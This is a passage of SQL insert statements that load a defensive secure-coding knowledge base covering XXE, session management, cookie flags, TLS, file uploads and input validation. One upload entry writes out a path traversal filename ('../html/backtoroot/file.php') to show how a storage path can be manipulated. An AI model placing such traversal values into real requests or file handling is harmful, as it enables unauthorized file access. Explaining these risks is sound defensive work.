When adding schema''s to your JSON or XML files you have better control over what type of userinput can be supplied in your application. This dramatically decreases an attacker’s vector when implemented the right way. Nonetheless, you should always apply your own input validation and rejection as an extra layer of defense. This approach is also desirable since you also want to do countering and logging on the user’s requests and input.	 

 Solution:

Verify that XML or JSON schema are in place and verified before accepting input.

', 'JSON XML schema'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('6',' Description:

Processing of an Xml eXternal Entity containing tainted data may lead to the disclosure of
confidential information and other system impacts.
The XML 1.0 standard defines the structure of an XML document.
The standard defines a concept called an entity, which is a storage unit of some type.

There exists a specific type of entity, an external general parsed entity often shortened
to an external entity, that can access local or remote content via a declared system
identifier and the XML processor may disclose confidential information normally not
accessible by the application. Attacks can include disclosing local files, which may
contain sensitive data such as passwords or private user data.

 Solution:

Disable the possibility to fetch resources from an external source.
This is normally done in the configuration of the used XML parser.
', 'XXE injections'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('147','If the application framework allows automatic mass parameter assignment
(also called automatic variable binding) from the inbound request to a model,
verify that security sensitive fields such as ''accountBalance'', ''role'' or ''password''
are protected from malicious automatic binding. Whenever your application takes parameters
in HTTPs GET statement and passes them as variables to code within the application this
could become a safety hazard since the application processes these variables
in his operations.

 Solution:

When working with automatic variable binding you should create whitelists of what
parameters are expected and allow only these parameters to be passed into your
application operation.
', 'Automatic parameter binding'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('105',' Description:

Before pushing a code live you should check the software for malicious code in order to
make sure no developers with evil intent made backdoors or deliberately put in exploits.

Dependencies and third party libraries should also be validated against malicious code.
These depedencies and libraries should also be validated for known vulnerabilities (CVE)

 Solution:

Running your code through a static code analyzer or auditing tools could give you a chance
to find malicious pieces of code which could be embedded into the software.
Also if the new or adjusted functionality is critical then check manually it in the form
of a code review for back doors, Easter eggs, and logic flaws.

This should also mean that authorized administrators must have the capability to verify the integrity of
all securityrelevant configurations to ensure that they have not been tampered with.

Determine also that the business logic of highvalue transactions is not imported from untrusted third party libraries.

Note:
Studies have shown backdoors written by employees with malicious intend will propably do this within
the first half year of their employment. The implementing of back doors has little to do with how happy an
employee is with the current employer, it has proven to be a trait of character rather than a trait of discontent.
', 'Malicious intent'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('140',' Description:

Developers creating HTML5 applications can create fully offlineaware applications using
the HTML5 ApplicationCache interface. The Application Cache uses a cache manifest file to
specify which files in an HTML5 application can be used offline, and which files require a
network connection.

 Solution:

Never store sensitive information in a client side cache since this can be easily
compromised by attackers. The same principle does also apply to autocomplete functions.

Recommended knowledge base item:

 Caching headers
 Client side storage
', 'HTML Caching and client side caching'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('209',' Description:

Browser autocomplete and password managers could be used by attackers to steal sensitive
information. Whenever an application is susceptible to XSS (Cross site scripting) attacks,
the attacker can inject forms into the application which are autocompleted by the browser.

The attacker can then use JavaScript to read the input fields and steal credentials or
other sensitive information.

 Solution:

The browser should explicitly be told for all the input fields that the autocomplete function
should be turned off. The "autocomplete=off" HTML attribute should be added to all the input and
hidden input fields in the form you want to disable the autocomplete of.

', 'Disable autocomplete for all the input fields in forms'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('40',' Description:

When an attacker obtains a users session cookie, then he can steal the identity of the
user which the session cookie belongs to.

 Solution:

As soon as a session is set for an authenticated user,
the server should keep track of the IP address in which the user used when he started the session.
When the server discovers a change in IP address, for instance when an attacker hijacks an
users session. The server then should deny access, destroy the session and redirect the
''hijacker'' to the login page.
', 'External session hijacking'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('225',' Description:

I/O commands allow you to own, use, read from, write to, close devices and To direct I/O operations to a device.
Whenever user supplied input i.e file names and/or file data is being directly used in these commands, this could lead 
to path traversal, local file include, file mime type, and OS command injection vulnerabilities.

 Solution:

File names and file contents should be sanitized before being used in I/O commands. 
', 'File'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('81',' Description:

Whenever IP addresses are used in HTTP headers in internal structures of your organization,
an attacker could use these to enlarge his attack vector and reconstruct your
internal infrastructures.

 Solution:

Never use IP addresses in internal HTTP headers.
', 'IP adresses in internal HTTP headers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('247',' Description:

TLS settings must always be in line with current leading practice. Whenever TLS
settings and ciphers get outdated, the TLS connection can be degraded/broken and used by
attackers to eavesdrop on users traffic over the application.

 Solution:

There should be structural scans that are done regularly against the applications TLS settings
and configurations to check whether the TLS settings are in line with current leading practice.

This could be achieved by using the SSLLabs api or the OWASP OSaft project.

OSaft is an easy to use tool to show informations about SSL certificate and tests the SSL 
connection according to a given list of ciphers and various SSL configurations.

It''s designed to be used by penetration testers, security auditors or server administrators. 
The idea is to show the important information or the special checks with a simple call of the tool.
However, it provides a wide range of options so that it can be used for comprehensive and special 
checks by experienced people.

', 'TLS settings are in line with current leading practice'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('144',' Description:

Whenever data from untrusted servers is executed by your application there is a high
probability this data could be contaminated with malicious code. Such as for example
XSS from JSON files, or XXE when parsing XML files.

 Solution:

Verify the application code does not execute uploaded data obtained from untrusted sources.
You could consider sandboxing this data when showing the content on your application.

NOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended to
also encode or escape all data entering your application from third party sources.
', 'Data from untrusted sources'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('41',' Description:

If the session cookies are sent over an unencrypted connection,
they should be withdrawn immediately.
These cookies are not to be trusted anymore as a hacker may have captured their values.

 Solution:

Session cookies that are used to authenticate the user should always be set on a
secure connection.

In order to achieve this, you should set the "secure" flag on your session cookie
to make sure your application in any circumstance does not send this cookie over nonHTTPS connections.
', 'Insecure transmission of session cookies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('162',' Description:

Sometimes your application has certain external dependencies which may strongly
influence your application''s operation. These external dependencies
might become an attackers target since compromising that service might lead to
a DoS of your system or influence the system in such a way it leaves room for other
attacks.

 Solution:

First, you must identify which external dependencies your application relays on
for its operation. Second, there should be a failsafe implemented should this dependency ever
fail to deliver its services towards your application.
', 'Identify external dependencies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('22',' Description:

The only defined value, nosniff, prevents Internet Explorer and Google Chrome from
MIMEsniffing a response away from the declared contenttype.
This also applies to Google Chrome, when downloading extensions.
This reduces exposure to driveby download attacks and sites serving user uploaded
content that, by clever naming, could be treated by MSIE as executable or dynamic HTML
files.

 Solution:

These headers are also known as the: XContentTypeOptions: nosniff;
and provide protection against Mime content type attacks when implemented in the
application or webserver.
', 'Include X Content Type Options header'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('191',' Description:

Log separation is indispensable in order to prevent it from either radically downgrading your
application its performance or even causing a Denial of service because the server becomes
unavailable due to the flooding of logs.

 Solution:

Log rotation is an automated process used in system administration in which dated log
files are archived. Servers which run large applications, such as LAMP stacks, often
log every request: in the face of bulky logs, log rotation is a way to limit the total
size of the logs while still allowing analysis of recent events.

Log separation basically means that you have to store your log files on a different partition
as where your OS/application is running on in order to avert a Denial of service attack or the downgrading
of your application its performance.
', 'Log rotation and seperation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('214',' Description:

Secret keys, API tokens, or passwords must be dynamically generated. Whenever these tokens
are not dynamically generated they can become predicable and used by attackers to compromise
user accounts. 

 Solution:

When it comes to API tokens and secret keys these values have to be dynamically generated 
and should be cryptographically random secure with at least 120 bit of effective entropy.

Passwords on the other hand should be created by the user himself, rather than assigning
a user a dynamically generated password. The user should be presented a link with a 
cryptographically random token by means of an email or SMS which is used to activate his 
account and provide a password of his own.
 
', 'Secrets should be secure random generated'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('259',' Description:

Applications have often different ways for granting access to protected resources, sometimes these are 
done based on a role that is defined in a Database or using an Active Directory permission. Also, external
authorization services may be implemented and needed for the application. With all these different ways 
for protecting resources and the access to these assets mistakes will be easily made. 

 Solution:

Immplement a centralized mechanism where all the different types of resources and grating access to 
these resources (including libraries that call external authorization services) are located. This way
it''s easier to maintain and the lower the complexity.
', 'Centralized the mechanisms for protecting resources and the access'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('114',' Description:

Handling errors securely is a key aspect of secure coding.
There are two types of errors that deserve special attention. The first is exceptions
that occur in the processing of a security control itself. It''s important that these
exceptions do not enable behavior that the countermeasure would normally not allow.
As a developer, you should consider that there are generally three possible outcomes
from a security mechanism:

1. Allow the operation
2. Disallow the operation
3. Exception

In general, you should design your security mechanism so that a failure will follow the same execution path
as disabling the operation

 Solution:

Make sure all the access control systems are thoroughly tested for failing securely before
using it in your application. It is common that complete unittest are created especially
for this purpose.
', 'All authentication controls must fail securely'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('129',' Description:

HTTP offers a number of methods that can be used to perform actions on the web server.
Many of these methods are designed to aid developers in deploying and testing
HTTP applications. These HTTP methods can be used for nefarious purposes if the web
server is misconfigured.

 Solution:

Verify that the application accepts only a defined set of HTTP request methods, such as
GET and POST and unused methods are explicitly blocked/disabled.
', 'HTTP request methods'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('69',' Description:

Whenever the document root contains extraneous files, these files could be accessed by an
attacker or could possibly contain functionality which could contain other vulnerabilities.

 Solution:

Extraneous files in document root should be investigated and deleted if it''s not necessary
for the operation of the application.

There are more chances of accessing hidden folders, files and some configuration files to be
accessed through document root.

For example if you are using some version control system like git or svn. You may have .git,
.svn folders and .gitignore files. If you are using IDE project files, you may have .idea hidden folder. Even there are chances of configuration files with common extensions, like config.json, config.yml, config.xml, package.json, .htaccess, README.md files to be present in the document root.
Even there are chances of having swap files, backup files to be there in the document root.

The solution for this problem is to prevent directory listing , remove the hidden folders, files and configuration files. We can even prevent the users from accessing this files with properly 
configuring the configuration files of the server like .htaccess files.', 'Extraneous files in document root'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('239',' Description:

A sandbox is a security mechanism for separating running programs. 
It is often used to execute untested code, or untrusted programs from 
unverified thirdparties, suppliers, untrusted users and untrusted websites. It''s creating 
an extra layer of security where an attacker first needs to break out from.


 Solution:

Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an 
iframe enables restrictions on content within an iframe. The following restrictions are 

Active when the sandbox attribute is set: 

 All markup is treated as being from a unique origin
 All forms and scripts are disabled. 
 All links are prevented from targeting other browsing contexts 
 All features that trigger automatically are blocked 
 All plugins are disabled 

It is possible to have a finegrained control over iframe capabilities using the value of 
the sandbox attribute. In old versions of user agents where this feature is not supported, 
this attribute will be ignored. Use this feature as an additional layer of protection or 
check if the browser supports sandboxed frames and only show the untrusted 
content if supported. Apart from this attribute, to prevent Clickjacking attacks and 
unsolicited framing it is encouraged to use the header XFrameOptions which supports 
the deny and sameorigin values. Other solutions like framebusting: 

```JavaScript
if(window!== window.top) { window.top.location = location; } 
Only for legacy browser support
```
', 'Sandboxing malicious code'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('52',' Description:

Whenever sensitive information is sent by unencrypted methods an attacker could intercept
this data and use this for malicious intents.

 Solution:

All sensitive information should always be sent by encrypted methods
such as HTTPS(TLS) connections.


', 'Sensitive information transmitted by unencrypted methods'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('222',' Description:

Applications should encourage the use of strong passwords and passphrases. Preferably the
password policy should not put limitations or restrictions on the chosen passwords.
Whenever the application supports strong passwords and the use of password managers, the
possibility for an attacker performing a succesfull bruteforce attack drops significally.

This also increases the possibility that the application can be used with users'' passwords managers.

 Solution:

Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent
password managers, long passphrases or highly complex passwords being entered. 

', 'Block common password and weak passphrases'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('39',' Description:

An HttpOnly flag is an option that can be set when creating a cookie. This flag ensures that the cookie cannot be read or edited by JavaScript. This ensures an attacker cannot steal this cookie as a crosssite scripting vulnerability is present in the application.

 Solution:

The HttpOnly flag should be set to disable malicious script access to the cookie values such as the session ID value. Also, disable unnecessary HTTP request methods such as the TRACE option. Misconfiguration of the HTTP request headers can lead to stealing the session cookie even though HttpOnly protection is in place.
', 'Session cookies without the HttpOnly flag'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('253',' Description:

Whenever the user is presented a summary of all concurrent sessions, this decreases a potentially
succesful hijacking attack since the user can now see all sessions and terminate one whenever
it does not feel trusted.

 Solution:

The user should be presented with all concurrent and active sessions in his profile/account 
summary. This way the user can keep track of what is happening and can choose to terminate a 
session whenever it feels untrusted. 

Whenever the user shared permission to other applications by means of for example OAuth,
than the user should also be presented that have shared permissions along with the type of permissions 
and activation date.

', 'Display concurrent and active sessions'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('190',' Description:

Client side storage also known as Offline Storage or Web Storage. The Underlying storage mechanism may vary from one
user agent to the next. In other words, any authentication your application requires can
be bypassed by a user with local privileges to the machine on which the data is stored.
Therefore, it''s recommended not to store any sensitive information in local storage.

 Solution:

Verify that authenticated data is cleared from client storage, such as the browser DOM, after the
session is terminated. This also goes for other session and local storage information which could
assist an attacker launching an successful attack.

Verify that data stored in client side storage (such as HTML5 local storage, session storage, IndexedDB, regular
cookies or Flash cookies) does not contain sensitive data or PII (personal identifiable information).


', 'Client side storage'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('197',' Description:

Simple Soap Binding Profile is a specification from the Web Services Interoperability industry consortium. It
is intended as a support profile for the WSI Basic Profile. This profile defines the way WSDL
documents are to bind operations to a specific transport protocol SOAP.

 Solution:

Verify that the SOAP based web services are making use of the WSI Basic profile. To be compliant with this standard, it essentially means the application infrastructure must be TLS protected.

Source:
http://www.wsi.org/Profiles/SimpleSoapBindingProfile1.0.html
', 'SOAP basic profile'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('31',' Description:

Tokens or passwords that are used within the application must contain high entropy in
order to prevent the prediction of these values.

 Solution:

Tokens should contain a high level entropy and randomness to prevent predictable token generation.
All random numbers, random file names, random GUIDs, and random must be generated using
the cryptographic module''s approved random number generator
when these random values are intended to be unguessable by an attacker.
', 'Predictable password and or token generation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('142',' Description:

Whenever an application sends data/parameters to untrusted devices this data could be
compromised if the device has malicious intents.

 Solution:

Verify the application minimizes the number of parameters sent to untrusted systems,
such as hidden fields, Ajax variables, cookies and header values.

These untrusted devices should also be documented if possible and should be taken into
account when developing your application to minimize the possibility you send
unintended sensitive data towards these devices.

Recommended knowledge base items:

 Highlevel architecture should be defined
 Identify all application components
', 'Sending data parameters to untrusted devices'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('219',' Description:

The application should never export sensitive activities, intents, or content providers.
These activities could than potentially be exploited by third party applications installed
on the same device.

 Solution:

Identify throughout the application if there are any sensitive activities, intents or 
content providers that are being exported. 

', 'Protect sensitive activities intents or content providers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('216',' Description:

The application should always be request minimal permissions for required functionality and
resources. This is also known as principle of least privilege. The principle of least privilege 
recommends that accounts have the least amount of privilege required to perform their 
business processes. This encompasses user rights, resource permissions such as CPU limits, 
memory, network, and file system permissions. 

Whenever the application is compromised by a potential attacker, the attacker does not gain more arbitrary control over the victim''s device

 Solution:

Verify that the application is requesting minimal permissions for required functionality and
resources.

', 'Principle of least privilege'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('128',' Description:

Character encoding is the process of mapping characters, numbers and other symbols to a
standard format. Typically, this is done to create a message ready for transmission
between sender and receiver. It is, in simple terms, the conversion of characters
(belonging to different languages like English, Chinese, Greek or any other known language)
into bytes. An example of a widely used character encoding scheme is the American
Standard Code for Information Interchange (ASCII) that initially used 7bit codes.
More recent examples of encoding schemes would be the Unicode UTF8 and UTF16 computing
industry standards. In the space of application security and due to the plethora of
encoding schemes available, character encoding has a popular misuse. It is being used for
encoding malicious injection strings in a way that obfuscates them. This can lead to the
bypass of input validation filters, or take advantage of particular ways in which browsers
render encoded text.

 Solution:

When trying to figure out the character encoding of a resource, user agents will try, in
this order:

 The HTTP ContentType header sent by the server
 The XML declaration (only for XHTML documents)
 HTML/XHTML meta element.

Make sure this information is provided by your application for the server in order to
prevent it from guessing the wrong encoding standard, leaving room for injection.

 Note:

These three ways of providing the character encoding of a document are not
equivalent.
', 'Character encoding'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('89',' Description:

All sessions should implement an absolute timeout, regardless of session activity.
This timeout defines the maximum amount of time a session can be active,
closing and invalidating the session upon the defined absolute period since the given
session was initially created by the web application. After invalidating the session,
the user is forced to (re)authenticate again in the web application and establish
a new session. The absolute session limits the amount of time an attacker can use a
hijacked session and impersonate the victim user.

 Solution:

Always ensure that sessions absolute timeout  is on the serverside in order to decrease a hackers
attack vector.
', 'Absolute session time out'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('258',' Description:

Applications have many different components that are needed for the business functions 
or for the security functions they provide. With many different components, there are
also possible vulnerabilities that can arise. Also, most of the components functions 
that are delivered are not necessary needed and can introduce a vulnerability in a specific part
that may not be even used by the application. Also, these security issues in the components 
are publicly well know and documented. 

 Solution:

The best approach in minimizing the possible security issues that can arise in application 
components and identify the required functions and disable or remove those that are not
needed by the application business functions or security functions. This way there is a lower risk
when using those components and easier to maintain and protecting the application.
', 'Identify and use only require functions if using components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('85',' Description:

Some parts of the application at first sight might seem to acquire a higher level of
security than i.e unauthorized/public parts of the application.
This however, is not true since breaching public parts could also lead to an attacker
compromising the application or other users accounts.

 Solution:

Always ensure full hardened security on all layers of the web application.
', 'Ensure overall security'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('57',' Description:

When the logout functionality does not revoke the complete session, an attacker could still
impersonate a user when he has access to the session cookie even after the user is logged off the application.

 Solution:

The logout functionality should revoke the complete session whenever a user
wants to terminate his session.

Each different framework has its own guide to achieve this revocation.
It is also recommended for you to make test cases which you follow to ensure
session revocation in your application.
', 'The logout functionality should revoke the complete session'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('104',' Description:

Setting the right content headers is important for hardening your applications security,
this reduces exposure to driveby download attacks or sites serving user uploaded
content that, by clever naming could be treated by MS Internet Explorer as executable or
dynamic HTML files and thus can lead to security vulnerabilities.

 Solution:

An example of a content type header would be:  

    ContentType: text/html; charset=UTF8
    or:
    ContentType: application/json;
', 'Content type headers'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('18',' Description:

Applications often include files in other pages. When these files can be directly
approached by normal users, the operation of the application can be traced because the
source code becomes available. This improves the possibility that the attacker discovers
vulnerabilities.

It is also highly recommended that old files are removed from the server and not beind stored
or backuped as i.e "file.php.old". 

 Solution:

Always add the different types of extensions to the webserver handler to parse.
This way the file source cannot be viewed.
', 'Accessible non parsed dynamic scripts'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('95',' Description:

To ensure that the application is robust against all forms of input data, this data should
be sanitized and/or encoded on serverside since an attacker could otherwise easy bypass
these checks with an intercepting proxy.

 Solution:

All input validation and encodingroutines should be implemented on the serverside
outside the reach of an attacker. Just as with the input rejection you should make sure that
after validating the userinput, whenever the input is bad it actually rejects, sanitizes
or formats your userinput into not malicious data.

The recommended method for validating user input would be the positive validation method.
Whitelist input validation means allowing only input that is explicitly defined as valid,
as opposed to blacklist input validation, which filters out known bad input.

You must also keep track of the users movements by adding an audit trail as well as a
counter for tracking the number of his violations(submitting bad input) in your input
validation class. You should enforce a lockout whenever a unreasonable number of
violations are detected by your application in order to protect it from attackers.


', 'Input validation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('208',' Description:

Whenever security researchers find a vulnerability in a library, modules, frameworks, platforms or 
operating system, these vulnerabilities are reported and saved in the CVE list. 

CVE is a list of information security vulnerabilities and exposures that aims to provide 
common names for  publicly known cyber security issues. The goal of CVE is to make it easier 
to share data  across separate vulnerability capabilities (tools, repositories, and services) 
with this "common enumeration."

Attackers can use these lists to find publicly known exploits which might exists in the target application. 
A lot of popular CVE exploits also have exploits available in Metasploit
or the Exploit database. This enables script kiddies to easily exploit the target applications
services, libraries and operating systems.

 Solution:

Verify that all application components, libraries, modules,
frameworks, platform, and operating systems are free from known vulnerabilities.

This could be achieved with for example, strict patch management and periodic scanning of
the environment for new issued CVEs''. 

It is also highly recommended to run the applications libraries and modules in the SDLC 
through tools like OWASP dependency check. This tool checks imported modules and libraries
for known CVEs''

    https://www.owasp.org/index.php/OWASP_Dependency_Check
', 'Verify application is not vulnerable for known security issues'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('199',' Description:

Using build platforms on premise or as a service is one of the core components in a SDLC.
These build and deploy servers are sometimes not perfect for performing secure builds or deploys.
This is because the lack of hardening of the OS for security improvements where the application
could also benefit from this hardening. Also the access of third party services can lead to
compromise of the secrets or integrity of the code of the application.

 Solution:

Building your application should always be done on a server that you trust, you are in control and
has the latest security patches and hardening configured. For deploying the application the same
rules apply, also think about what type of third party services can access the code or modify it.
Creating scripts to monitor for bad behavior of a third party service can be an option as an extra
quality control check.
', 'Build and deploy in a secure fashion'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('251',' Description:

Whenever secrets, API keys, and passwords are stored in the applications source code an attacker
can potentially retrieve this sensitive information by i.e:

1. Finding old zip files with earlier releases
2. Retrieve and read files by path traversal attacks

Also be cautious not to store this sensitive information on online repositories.
Whenever this repository gets made public by accident or compromised all this sensitive information
can fall into the hands of attackers.

 Solution:

Verify that secrets, API keys, and passwords are not included in the source code, or online source code 
repositories.This could be achieved by manual code reviews and potentially small tools that checks the code
for these keys and secrets by means of pattern matching.
', 'Sensitive information in code or online repositories'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('92',' Description:

The Domain option allows you to specify whether or not to send the cookie to subdomains.

 Solution:

Setting www.example.com will mean only the exact domain www.example.com will
be matched, while .example.com (wildcard) will also match again any
subdomain (forums.example.com, blog.example.com).

The use of a wildcard is not recommended at all and should be avoided.

There are a lot of different mitigations in order to harden your session management.
These mitigations are amongst others the setting of the "HttpOnly and secure" flags on
your sessions. Follow the "Sessions pattern" list to make sure your session management is
secure.

Recommended knowledge base items:

 Cross subdomain cookie attacks

', 'Session Domain cookies'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('150',' Description:

Access to any master secret must be protected from unauthorized access in order to protect
the integrity and the confidentiality of the data.

 Solution:

Whenever sensitive data is stored on the server you should consider storing this data in a separate folder with permission rules in order to prevent unauthorized users from reading these files. It is also highly recommended to encrypt/hash the password in order to enforce higher security.
', 'Access to any master secret must be protected from unauthorized access'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('227',' Description:

Files that are uploaded by users or other untrusted services should always be placed outside
of the document root. This is to prevent malicious files from being parsed by attackers such as PHP files.

Should an attacker succeed to bypass file upload restrictions and upload a malicous file, it would
be impossible for the attacker to parse these files since they are not located inside of the
applications document root.

 Solution:

Files should be stored outside of the applications document root. Preferably files should be stored
on a seperate file server which serves back and forth to the application server. 

Files should always be stored outside of the scope of the attacker to prevent files from
being parsed or executed.

When storing files outside of the document root, take into consideration potential path traversal injections
in the applications file name such as "../html/backtoroot/file.php". Whenever this filename is being used directly
into the path that is used to store files, it could be used to manipulate the storage path.
', 'File upload outside document root'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('58',' Description:

Whenever an user is successfully authenticated the application should generate a
new session cookie.

 Solution:

The login functionality should always generate (and use) a new session ID after a
successful login. This is done to prevent an attacker doing a session fixation attack
on your users.

Some frameworks do not provide the possibility to change the session ID on login such as
.net applications. Whenever this problem occurs you could set an extra random cookie on
login  with a strong token and store this value in a session variable.

Now you can compare the cookie value with the session variable in order to prevent
session fixation since the authentication does not solely rely on the session ID since
the random cookie can not be predicted or fixated by the attacker.
', 'The login functionality should always generate a new session id'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('171',' Description:

OCSP stapling, formally known as the TLS Certificate Status Request extension, is an
alternative approach to the Online Certificate Status Protocol (OCSP) for checking the
revocation status of X.509 digital certificates. It allows the presenter of a
certificate to bear the resource cost involved in providing OCSP responses by appending
("stapling") a timestamped OCSP response signed by the CA to the initial TLS Handshake,
eliminating the need for clients to contact the CA

 Solution:

Stapling basically means that the certificate holder queries the OCSP server themselves at
regular intervals, obtaining a signed timestamped OCSP response. When the site''s visitors
attempt to connect to the site, this response is included ("stapled") with the TLS/SSL
Handshake via the Certificate Status Request extension response (note: the TLS client must
explicitly include a Certificate Status Request extension in its ClientHello TLS/SSL
handshake message). While it may appear that allowing the site operator to control
verification responses would allow a fraudulent site to issue false verification for a
revoked certificate, the stapled responses can''t be forged as they need to be directly
signed by the certificate authority, not the server. If the client does not receive a
stapled response, it will just contact the OCSP server by itself. However, if the
client receives an invalid stapled response, it will abort the connection. The only
increased risk of OCSP stapling is that the notification of revocation for a certificate
may be delayed until the lastsigned OCSP response expires.

For more detailed information about Specification, Deployment, and limitation visit:
https://en.wikipedia.org/wiki/OCSP_stapling
', 'OCSP stapling'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('166',' Description:

As web applications become more advanced, an increasing amount of HTML is generated by
JavaScript on the clientside rather than by the server. Anytime content needs to be
changed without refreshing the entire page, the update must be performed using JavaScript.
Most notably, this is the case when a page is updated after an AJAX request.

XSS vulnerabilities can be present not only in your website''s serverside code, but also
in your website''s clientside JavaScript code. Consequently, even with completely
secure serverside code, the clientside code might still unsafely include user input in a
DOM update after the page has loaded. If this happens, the clientside code has enabled
an XSS attack through no fault of the serverside code.

 Solution:

First, there must be a client side input validation method as you would apply to the server
side. This means you should also apply input rejection as well as typecasting and such.
This is to prevent users from being attacked by XSS attacks which are undetectable by
the server.

Recommended knowledge base items:

 Positive validation method
 Single input validation controls
 Input rejection
 Input validation
', 'Client side input validation'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('189',' Description:

Some frameworks/templates have the option to autoescape all incoming userinput to harmless
encoded data in order to prevent attacks. However, this autoescaping functionality is also
optional to be disabled. Whenever this autoescaping function has been disabled your application
might be vulnerable to attacks like XSS.

 Solution:

Whenever autoescaping functionality in your application has been disabled for whatever reason, you
should make sure there is other protection in place like a HTML sanitizer in order to
prevent attackers from injecting malicious code into your application.
', 'Auto escaping technology'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('237',' Description:

Only authorized administrators should have access to change securityrelevant configurations.

These administrators should also regularly check these configurations to be adequate and that
they are not unchanged by malicious intent. This could keep systems vulnerable to attacks due
to the disabling of important security systems.


 Solution:

Verify that authorised administrators have the capability to verify the
integrity of all securityrelevant configurations to ensure that they have not been tampered with.

One way to achieve this would be to apply (HIDS) rules. 
This is a system that monitors important operating system files and can verify whether these files
have been edited. Whenever these files are edited a four eyes principle must be applied that checks
the integrity of these changes.
', 'Validate the integrity of all security relevant configurations'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('43',' Description:

An application could implement authentication functionalities through JavaScript and HTML.
However, these are clientside constraints that are imposed, which means that a hacker
can easily disable or modify these constraints.

 Solution:

Never implement clientside authentication constraints, since these are easily bypassed.
When implementing authentication methods always use serverside solutions.
', 'Client side authentication'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('29',' Description:

Login functions should not be abused in an automated way that an attacker could create a
script that contains a list of usernames and passwords, which he could use against your
login function in order to gain unauthorized access to user accounts.

 Solution:

Implement a method that limits the amount of tries with automated tools.
Some examples are using a CAPTCHA or a TARPIT(ratelimiting) method.

Be aware that a simple limitation on number of tries may be used as a method to perform denialofservice attack and hence to block certain users like system administrator from logging in. A mechanism combines tries limit with challengeresponse test can be used to prevent this risk while providing convenience for actual user login. For example, start to ask user to complete a CAPTCHA or a TARPIT question during login after a certain number of tries is reached.
', 'Brute force password guessing'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('206',' Description:

It''s always possible that an attacker can find a security flaw and abuse this to gain access
to the server. From here the attacker tries to further infiltrate into the network and other
important components of the application for example the database. This database should be firewalled
correctly so it''s not accessible from the internet. Also this database has it own server and is in a
different segment of the network. Always apply INGRESS and EGRESS filtering for all the servers used.

 Solution:

Verify that components are segregated from each other via a defined security control, such as
network segmentation, firewall rules, or cloud based security groups.
', 'Segregated components'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('184',' Description:

Whenever security controls do not have a centralized implementation there is a high
probability for bugs or security issues being hidden into your application due to the loss
of abstraction and duplication.

 Solution:

Make sure all your different type of security controls have a centralized place of implementation.
Also verify that error handling logic in security controls denies access by default.
', 'centralized security controls'); 
INSERT OR REPLACE INTO kb_items (kbID, content, title) VALUES ('155',' Description:

Whenever a user can submit a form in your system you should consider implementing
the following defense mechanism in order to ensure highlevel security.

1.  Single user input validation controls and Audit logs
2.  CSRF tokens
3.  Principle of least privilege
4.  GET/POST requests

 Solution:

Here are the steps described briefly.
For more detailed information you should look into these items in the knowledge base.

First, you should create a single user input validation control class which should
validate the expected input values in order to verify if the user is not tampering data
or is injecting malicious code into your application. All infringements should be logged
and repercussions should be taken whenever these infringements are frequent.

Second, whenever an authenticated user is submitting the form always ensure the forms contain CSRF tokens in order to prevent crosssite request forgery.
